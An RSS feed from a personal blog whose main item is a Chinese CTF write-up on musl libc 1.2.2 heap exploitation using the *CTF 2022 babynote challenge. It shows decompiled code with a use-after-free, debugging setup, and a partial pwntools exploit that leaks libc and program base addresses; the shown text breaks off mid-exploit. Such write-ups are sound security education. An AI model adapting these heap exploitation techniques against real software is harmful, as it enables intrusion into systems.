<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>J4f&#39;s blog</title>
    <link>http://localhost:1313/</link>
    <description>J4f&#39;s blog</description>
    <generator>Hugo 0.154.3 &amp; FixIt v0.4.2-20260109063229-50d27e0e</generator>
    <language>en</language>
    <lastBuildDate>Sat, 10 Jan 2026 13:23:50 +0800</lastBuildDate>
    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>《基督山伯爵》</title>
      <link>http://localhost:1313/posts/read_jdsbj/</link>
      <pubDate>Sat, 10 Jan 2026 03:13:46 +0800</pubDate>
      <guid>http://localhost:1313/posts/read_jdsbj/</guid>
      <description></description>
    </item>
    <item>
      <title>通过*ctf2022_babynote入门musl pwn</title>
      <link>http://localhost:1313/posts/musl_pwn/</link>
      <pubDate>Sat, 10 Jan 2026 02:01:48 +0800</pubDate>
      <guid>http://localhost:1313/posts/musl_pwn/</guid>
      <category domain="http://localhost:1313/categories/pwn/">Pwn</category>
      <description>&lt;p&gt;&lt;del&gt;看到&lt;code&gt;hkcertctf&lt;/code&gt;出了一道&lt;code&gt;musl&lt;/code&gt;的题来学习一下&lt;/del&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;前言&#34;&gt;&lt;span&gt;前言&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%89%8d%e8%a8%80&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;基础知识部分就不详细列出了，列出一些我的参考文章。&lt;del&gt;其实主要还是看源码&lt;/del&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://9anux.org/2024/01/17/musl/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;io板子&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-269533.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;源码分析&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-274640-1.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;主要参考文章：小小做题家之musl1.2.2的利用手法&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;利用手法：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;dequeue：用于任意地址写&lt;/li&gt;&#xA;&lt;li&gt;queue：把&lt;code&gt;fake_meta&lt;/code&gt;链入&lt;code&gt;active&lt;/code&gt;链表，从而进行任意地址的堆块分配&lt;/li&gt;&#xA;&lt;li&gt;IO：有通过&lt;code&gt;puts&lt;/code&gt;和&lt;code&gt;exit&lt;/code&gt;触发的&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;环境配置&#34;&gt;&lt;span&gt;环境配置&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;编译libc&#34;&gt;&lt;span&gt;编译&lt;code&gt;libc&lt;/code&gt;&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%bc%96%e8%af%91libc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;拿到题目的&lt;code&gt;musl libc&lt;/code&gt;版本之后，最好自己编译一个&lt;code&gt;musl libc&lt;/code&gt;，使用自己编译的&lt;code&gt;libc&lt;/code&gt;启动题目有符号表能支持调试（有的题目给的&lt;code&gt;libc&lt;/code&gt;没有符号表就调试不了），调试的时候还能看到&lt;code&gt;musl&lt;/code&gt;的源码知道哪里出错了&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;查看&lt;code&gt;musl libc&lt;/code&gt;版本：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;./libc.so&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/kraj/musl.git&#xA;cd musl&#xA;git checkout v1.2.2&#xA;CFLAGS=&amp;#34;-g -O0&amp;#34; ./configure --prefix=$PWD/install&#xA;make -j$(nproc)&#xA;make install&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样&lt;code&gt;musl/install/lib&lt;/code&gt;下就有没去符号表的&lt;code&gt;libc.so&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;启动题目&#34;&gt;&lt;span&gt;启动题目&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%90%af%e5%8a%a8%e9%a2%98%e7%9b%ae&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;patchelf --set-interpreter ../musl-libc/v1.2.2 ./pwn&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后exp中直接&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;p = process(&amp;#34;./pwn&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;即可&lt;/p&gt;&#xA;&lt;p&gt;如果没有&lt;code&gt;patchelf&lt;/code&gt;，通过&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;./libc.so ./pwn&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;启动，会有点问题（虽然也不是不行）&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;调试&#34;&gt;&lt;span&gt;调试&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e8%b0%83%e8%af%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;sudo apt install musl-dbgsym&#xA;git clone https://github.com/xf1les/muslheap.git  &#xA;echo &amp;#34;source /path/to/muslheap.py&amp;#34; &amp;gt;&amp;gt; ~/.gdbinit&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;命令&lt;/th&gt;&#xA;          &lt;th&gt;作用&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mheap&lt;/td&gt;&#xA;          &lt;td&gt;可以查看&lt;code&gt;__malloc_context&lt;/code&gt;的部分信息，可以详细看到每一条&lt;code&gt;meta&lt;/code&gt;链表&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;p/x __malloc_context&lt;/td&gt;&#xA;          &lt;td&gt;可以查看&lt;code&gt;__malloc_context&lt;/code&gt;的详细信息，但无法详细看到每一条&lt;code&gt;meta&lt;/code&gt;链表&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mmagic&lt;/td&gt;&#xA;          &lt;td&gt;用于查看关键函数的地址&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;p/x &lt;em&gt;(struct meta&lt;/em&gt;) &amp;lt;meta地址&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;查看某个&lt;code&gt;meta&lt;/code&gt;结构体的详细信息&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;p/x &lt;em&gt;(struct group&lt;/em&gt;) &amp;lt;group地址&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;查看&lt;code&gt;group&lt;/code&gt;结构体详细信息&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mchunkinfo &lt;addr&gt;&lt;/td&gt;&#xA;          &lt;td&gt;查看某个用户指针所属 &lt;code&gt;slot &lt;/code&gt;的详细信息&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mfindslot  &lt;addr&gt;&lt;/td&gt;&#xA;          &lt;td&gt;从任意地址反向定位其所在 &lt;code&gt;slot&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;p/x stdout&lt;/td&gt;&#xA;          &lt;td&gt;查看&lt;code&gt;stdout&lt;/code&gt;结构体&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;p/x &lt;em&gt;(struct meta_area&lt;/em&gt;) &amp;lt;meta_area address&amp;gt;&lt;/td&gt;&#xA;          &lt;td&gt;查看&lt;code&gt;meta_area&lt;/code&gt;，&lt;code&gt;meta &amp;amp; 0xffffffffffff000&lt;/code&gt;就能找到&lt;code&gt;meta_arena&lt;/code&gt;结构体&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;ctf星ctfbabynote&#34;&gt;&lt;span&gt;*CTF（星CTF）——Babynote&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#ctf%e6%98%9fctfbabynote&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/sixstars/starctf2022/tree/main/pwn-BabyNote&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/sixstars/starctf2022/tree/main/pwn-BabyNote&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;逆向分析，略。。。&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;漏洞&#34;&gt;&lt;span&gt;漏洞&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%bc%8f%e6%b4%9e&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;add&lt;/code&gt;的时候，把&lt;code&gt;global_note&lt;/code&gt;给了&lt;code&gt;heap_ptr[4]&lt;/code&gt;，&lt;code&gt;delete&lt;/code&gt;的时候，没有把&lt;code&gt;heap_ptr[4]&lt;/code&gt;中的&lt;code&gt;global_note&lt;/code&gt;置0，存在&lt;code&gt;UAF&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;int __fastcall add(struct _IO_FILE *stderr)&#xA;{&#xA;  __int64 *heap_ptr; // [rsp&amp;#43;8h] [rbp-8h]&#xA;&#xA;  heap_ptr = (__int64 *)calloc(1u, 0x28u);&#xA;  heap_ptr[2] = create_name(heap_ptr);&#xA;  heap_ptr[3] = create_note(heap_ptr &amp;#43; 1);&#xA;  heap_ptr[4] = global_note;&#xA;  global_note = (__int64)heap_ptr;&#xA;  return puts(&amp;#34;ok&amp;#34;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;unsigned __int64 __fastcall delete(struct _IO_FILE *stderr)&#xA;{&#xA;  // ...&#xA;  ptr_1 = 0;&#xA;  size = create_name((__int64 *)&amp;amp;ptr_1);&#xA;  ptr = (void *)find_name(ptr_1, size);&#xA;  if ( ptr )&#xA;  {&#xA;    if ( ptr != (void *)global_note || *(_QWORD *)(global_note &amp;#43; 0x20) )// 要删除的是中间或末尾节点&#xA;    {&#xA;      if ( *((_QWORD *)ptr &amp;#43; 4) )&#xA;      {                                         // 遍历链表找到指向ptr的前一个节点的next指针位置&#xA;        for ( p_global_note = &amp;amp;global_note; ptr != (void *)*p_global_note; p_global_note = (__int64 *)(*p_global_note &amp;#43; 32) )&#xA;          ;&#xA;        *p_global_note = *((_QWORD *)ptr &amp;#43; 4);  // 更新前一个节点的next指针，从链表中移除ptr&#xA;      }&#xA;    }&#xA;    else&#xA;    {&#xA;      global_note = 0;                          // 要删除的是头节点且没有后继节点&#xA;    }&#xA;    free(*(void **)ptr);                        // 释放name指针&#xA;    free(*((void **)ptr &amp;#43; 1));                  // 释放note_content指针&#xA;    free(ptr);                                  // 释放节点本身&#xA;    puts(&amp;#34;ok&amp;#34;);&#xA;  }&#xA;  else&#xA;  {&#xA;    puts(&amp;#34;oops.....&amp;#34;);&#xA;  }&#xA;  free(ptr_1);&#xA;  // ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;流程&#34;&gt;&lt;span&gt;流程&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%b5%81%e7%a8%8b&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;整体流程可以分为这三步：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;泄露&lt;code&gt;elfbase&lt;/code&gt;、&lt;code&gt;libc_base&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;泄露&lt;code&gt;secret&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;把堆块申请在&lt;code&gt;stdout&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;第一步&#34;&gt;&lt;span&gt;第一步&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%ac%ac%e4%b8%80%e6%ad%a5&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;在前面两步泄露地址中，只需要关注&lt;code&gt;active[2]&lt;/code&gt;这个链表（0x30大小）&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;add&lt;/code&gt;一次，申请一个&lt;code&gt;0x30&lt;/code&gt;大小的&lt;code&gt;note1&lt;/code&gt;，来防止&lt;code&gt;free&lt;/code&gt;掉&lt;code&gt;group&lt;/code&gt;中所有&lt;code&gt;chunk&lt;/code&gt;时，将整个&lt;code&gt;group&lt;/code&gt;归还给堆管理器&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;接下来需要注意，&lt;code&gt;group&lt;/code&gt;对&lt;code&gt;chunk&lt;/code&gt;的管理策略：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;malloc&lt;/code&gt;的时候取的是&lt;code&gt;avail_mask&lt;/code&gt;中最低位的堆块，也就是一个&lt;code&gt;group&lt;/code&gt;中最低地址的堆块&lt;/li&gt;&#xA;&lt;li&gt;被&lt;code&gt;free&lt;/code&gt;掉的堆块，会把它的&lt;code&gt;free_mask&lt;/code&gt;置1，&lt;code&gt;avail_mask&lt;/code&gt;不动还是0&lt;/li&gt;&#xA;&lt;li&gt;当一个&lt;code&gt;group&lt;/code&gt;中没有&lt;code&gt;avail&lt;/code&gt;堆块时，会把被&lt;code&gt;free&lt;/code&gt;的堆块标记成&lt;code&gt;avail&lt;/code&gt;，&lt;code&gt;free_mask&lt;/code&gt;就置0了&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;接着把&lt;code&gt;note2&lt;/code&gt;申请到&lt;code&gt;active[2]&lt;/code&gt;的第十个&lt;code&gt;chunk&lt;/code&gt;的位置，&lt;code&gt;note2_content&lt;/code&gt;申请到第二个的位置&lt;/p&gt;&#xA;&lt;p&gt;申请&lt;code&gt;note3&lt;/code&gt;，并把&lt;code&gt;note2&lt;/code&gt;给&lt;code&gt;free&lt;/code&gt;掉，此时&lt;code&gt;note3&lt;/code&gt;还记录着&lt;code&gt;note2&lt;/code&gt;的位置即第十个&lt;code&gt;chunk&lt;/code&gt;的位置&lt;/p&gt;&#xA;&lt;p&gt;接着在&lt;code&gt;note2_content&lt;/code&gt;的位置申请&lt;code&gt;note4&lt;/code&gt;，泄露出&lt;code&gt;note4&lt;/code&gt;记录的两个堆地址&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Note&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;musl申请的堆块，有的大小能泄露elfbase，有的能泄露libc&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;pre&gt;&lt;code&gt;## leak libcbase &amp;amp;&amp;amp; elfbase&#xA;add(0x38,b&amp;#34;a&amp;#34;*0x38,0x38,b&amp;#34;a&amp;#34;*0x38) #防止将整个group归还给堆管理器&#xA;cho(4)&#xA;for _ in range(8):&#xA;    find(0x28,&amp;#34;a&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;2&amp;#34;*0x38,0x28,&amp;#34;2&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;3&amp;#34;*0x38,0x38,&amp;#34;3&amp;#34;*0x38)&#xA;delet(0x38,&amp;#34;2&amp;#34;*0x38)&#xA;for _ in range(6):&#xA;    find(0x28,&amp;#34;a&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;4&amp;#34;*0x38,0x58,&amp;#34;4&amp;#34;*0x58) #一个堆块泄露elfbase，一个libc&#xA;find(0x38,&amp;#34;2&amp;#34;*0x38)&#xA;p.recvuntil(&amp;#34;0x28:&amp;#34;)&#xA;libcbase=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;)) - 0xb7d60 #参考文章中，这里我本地不太对&#xA;libcbase_true=libcbase - 0x2b020 &amp;#43; 0x4000 